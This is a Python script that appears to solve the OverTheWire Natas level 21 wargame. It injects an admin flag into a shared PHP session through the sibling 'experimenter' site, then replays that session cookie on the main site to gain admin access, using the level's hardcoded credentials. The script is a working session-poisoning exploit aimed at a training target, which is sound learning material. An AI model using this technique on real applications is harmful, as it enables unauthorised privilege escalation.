import requests

target = 'http://natas21-experimenter.natas.labs.overthewire.org'
auth = ('natas21', 'BPhv63cKE1lkQl04cE5CuFTzXe15NfiH')

params = dict(debug='', submit='', admin=1)
cookies = dict()
r = requests.get(target, auth=auth, params=params, cookies=cookies)
phpsessid = r.cookies['PHPSESSID']
print(phpsessid)

target = 'http://natas21.natas.labs.overthewire.org'
params = dict(debug='')
cookies = dict(PHPSESSID=phpsessid)
r = requests.get(target, auth=auth, params=params, cookies=cookies)
print(r.text)
